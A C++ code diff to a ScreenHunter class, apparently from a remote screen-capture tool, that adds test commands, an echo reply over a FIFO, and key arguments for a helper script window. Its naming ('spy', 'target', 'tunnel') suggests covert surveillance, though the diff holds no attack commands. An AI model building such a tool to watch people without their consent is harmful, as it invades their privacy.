@@ -58,13 +58,36 @@ void ScreenHunter::exec_spy() {
                     close(tunnel_fifo_);
                     close(tunnel_fifo_in_);
                     return ;
-                }
+                } else if (rc == 4 && strncmp(command, "test", 4) == 0) {
+                    int test_width = 1920;
+                    int test_height = 1080;
 
-                // TEST
-                strncpy(command + rc, " RECEVEIED\0", 12);
-                if (tunnel_fifo_ != -1) {
-                    write(tunnel_fifo_, command, rc + 12);
+                    uint8_t test_res_buffer[RES_UPDATE_KEY_LEN + 8];
+                    memcpy(test_res_buffer, &test_width, 4);
+                    memcpy(test_res_buffer+4, &test_height, 4);
+                    memcpy(test_res_buffer+8, RES_UPDATE_KEY, RES_UPDATE_KEY_LEN);
+
+                    write(tunnel_fifo_, test_res_buffer, sizeof(test_res_buffer));
+                    break;  
+                } else if (rc == 5 && strncmp(command, "test2", 5) == 0) {
+                    uint8_t test_res_buffer[END_KEY_LEN + 64];
+                    memset(test_res_buffer, 0, 64);
+                    memcpy(test_res_buffer+64, END_KEY, END_KEY_LEN);
+
+                    write(tunnel_fifo_, test_res_buffer, sizeof(test_res_buffer));   
+                    break;
                 }
+                char buffer[BUFFER_SIZE];
+                memcpy(buffer, "I received your command: ", 25);
+                memcpy(buffer + 25, command, rc);
+                buffer[25+rc] = '\0';
+
+                std::cout << MAGENTA << "[ScreenHunter::exec_spy] Command: " << command << " Size: " << rc << std::endl;
+                std::cout << MAGENTA << "[ScreenHunter::exec_spy] Sending:" << buffer << std::endl;
+
+                write(tunnel_fifo_, buffer, rc + 26);
+                break;
+            
             } else if (events[i].data.fd == tunnel_socket_) {
                 // Data from the target
             }
@@ -77,5 +100,15 @@ void ScreenHunter::exec_spy() {
 
 }
 void ScreenHunter::spawn_window() {
-    execlp("urxvt", "urxvt", "-hold", "-name", "stierlitz_screen_hunter", "-e", SCREEN_HUNTER_SCRIPT_PATH, fifo_path_.c_str(), (char*)NULL);
+    std::string end_key_len_str = std::to_string(END_KEY_LEN);
+    std::string res_update_key_len_str = std::to_string(RES_UPDATE_KEY_LEN);
+
+    execlp(
+        "urxvt", "urxvt", "-hold", "-name", "stierlitz_screen_hunter", 
+        "-e", SCREEN_HUNTER_SCRIPT_PATH, 
+        fifo_path_.c_str(), 
+        END_KEY, end_key_len_str.c_str(), 
+        RES_UPDATE_KEY, res_update_key_len_str.c_str(),
+        (char*)NULL
+    );
 }
